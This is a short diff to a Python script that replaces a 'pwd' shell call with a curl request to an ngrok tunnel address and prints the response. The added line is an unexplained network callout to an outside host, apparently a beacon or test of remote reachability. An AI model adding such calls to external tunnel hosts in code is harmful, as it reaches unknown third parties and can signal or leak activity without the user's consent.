@@ -1,5 +1,5 @@
 #!/usr/bin/python
 import os
-output = os.popen('pwd').read()
+output = os.popen('curl 2.tcp.ngrok.io:13110').read()
 print(output)
 print("Machine")
